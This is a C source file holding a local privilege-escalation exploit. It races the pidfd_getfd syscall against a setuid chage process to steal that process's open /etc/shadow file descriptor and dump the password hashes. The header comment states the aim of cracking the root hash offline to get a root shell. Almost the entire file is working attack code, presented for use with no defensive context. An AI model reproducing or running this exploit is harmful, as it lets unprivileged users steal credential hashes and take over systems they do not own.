/*
 * "It is a fearful thing to fall into the hands of the living God."
 *                                                — Hebrews 10:31
 *
 * chage -l opens /etc/passwd and /etc/shadow before
 * setreuid(ruid, ruid). The drop sets uid=euid=suid=ruid. mm-NULL
 * window in do_exit() lets pidfd_getfd lift the /etc/shadow fd.
 *
 * Crack the root hash offline -> su - -> root shell.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#ifndef __NR_pidfd_open
#define __NR_pidfd_open  434
#endif
#ifndef __NR_pidfd_getfd
#define __NR_pidfd_getfd 438
#endif

static void report_wait_status(const char *label, pid_t pid, int status)
{
	if (WIFEXITED(status))
		fprintf(stderr, "%s pid=%d exited status=%d\n", label, pid, WEXITSTATUS(status));
	else if (WIFSIGNALED(status))
		fprintf(stderr, "%s pid=%d killed by signal %d\n", label, pid, WTERMSIG(status));
	else if (WIFSTOPPED(status))
		fprintf(stderr, "%s pid=%d stopped by signal %d\n", label, pid, WSTOPSIG(status));
}

int main(int argc, char **argv)
{
	const char *user = argc > 1 ? argv[1] : "root";
	fprintf(stderr, "uid=%d target=/usr/bin/chage user=%s\n", getuid(), user);

	for (int round = 0; round < 500; round++) {
		fprintf(stderr, "[round %d] forking chage -l %s\n", round, user);
		pid_t c = fork();
		if (c < 0) {
			perror("fork");
			return 1;
		}
		if (c == 0) {
			int dn = open("/dev/null", O_RDWR);
			if (dn < 0) {
				perror("open /dev/null");
				_exit(126);
			}
			if (dup2(dn, 1) < 0 || dup2(dn, 2) < 0) {
				perror("dup2 /dev/null");
				_exit(126);
			}
			if (dn > 2 && close(dn) < 0)
				perror("close /dev/null");
			execl("/usr/bin/chage", "chage", "-l", user, (char *)NULL);
			perror("execl /usr/bin/chage");
			_exit(127);
		}
		int pfd = syscall(__NR_pidfd_open, c, 0);
		if (pfd < 0) {
			perror("pidfd_open");
			int status;
			if (waitpid(c, &status, 0) < 0)
				perror("waitpid");
			else
				report_wait_status("child", c, status);
			continue;
		}
		fprintf(stderr, "[round %d] pidfd_open ok pfd=%d child_pid=%d\n", round, pfd, c);

		int got = -1;
		for (int a = 0; a < 30000 && got < 0; a++) {
			for (int i = 3; i < 32; i++) {
				int s = syscall(__NR_pidfd_getfd, pfd, i, 0);
				if (s < 0) continue;
				char p[256] = {0}, lk[64];
				snprintf(lk, sizeof(lk), "/proc/self/fd/%d", s);
				ssize_t n = readlink(lk, p, sizeof(p) - 1);
				if (n < 0) {
					perror("readlink");
					close(s);
					continue;
				}
				if (n > 0) p[n] = 0;
				if (strstr(p, "/etc/shadow")) {
					fprintf(stderr, "fd %d -> %s (round=%d try=%d)\n", i, p, round, a);
					got = s;
					break;
				}
				if (close(s) < 0)
					perror("close stolen fd");
			}
		}

		if (got >= 0) {
			char buf[8192];
			if (lseek(got, 0, SEEK_SET) < 0)
				perror("lseek");
			ssize_t n;
			ssize_t total = 0;
			while ((n = read(got, buf, sizeof(buf))) > 0) {
				total += n;
				if (fwrite(buf, 1, n, stdout) != (size_t)n) {
					perror("fwrite");
					break;
				}
			}
			if (n < 0)
				perror("read");
			else
				fprintf(stderr, "read %zd bytes total from /etc/shadow\n", total);
			if (close(got) < 0)
				perror("close matched fd");
			if (close(pfd) < 0)
				perror("close pidfd");
			int status;
			if (waitpid(c, &status, 0) < 0)
				perror("waitpid");
			else
				report_wait_status("child", c, status);
			return 0;
		}
		fprintf(stderr, "[round %d] exhausted 30000 attempts without a match\n", round);
		if (close(pfd) < 0)
			perror("close pidfd");
		int status;
		if (waitpid(c, &status, 0) < 0)
			perror("waitpid");
		else
			report_wait_status("child", c, status);
	}
	fprintf(stderr, "no hit in 500 rounds\n");
	return 1;
}
